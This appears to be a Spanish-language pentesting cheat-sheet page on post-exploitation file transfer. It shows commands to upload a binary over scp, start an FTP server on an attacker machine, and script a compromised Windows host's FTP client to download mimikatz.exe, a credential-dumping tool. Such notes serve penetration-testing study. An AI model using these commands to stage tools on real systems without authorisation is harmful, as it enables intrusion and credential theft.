---
layout: article
title: Pentesting - Post-explotación
aside:
  toc: true
sidebar:
  nav: side
header:
  theme: dark
  background: black
---

<h2>Transferencia de información</h2>

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Subida de información vía SSH</div>
</div>

**SSH**
~~~bash
scp <binario> <user>@<ip>:/tmp
~~~

<div class="grid">
  <div class="cell cell--20 cell--lg-20 content" id="custom-table-header">Subida de información vía FTP</div>
</div>

Levantar un servidor FTP en la máquina atacante:
~~~bash
pip3 install pyftpdlib ; python3 -m pyftpdlib -p 21
~~~

Guardar comandos FTP en un fichero dentro del sistema Windows:

~~~bash
echo open 192.168.150 21 > ftp.txt
echo USER anonymous >> ftp.txt
echo anonymous >> ftp.txt
echo bin >> ftp.txt
echo GET mimikatz.exe >> ftp.txt
echo bye >> ftp.txt
~~~

Ejecutar comandos ftp para descargar el binario
~~~cmd
ftp -n -v -s:ftp.txt"
~~~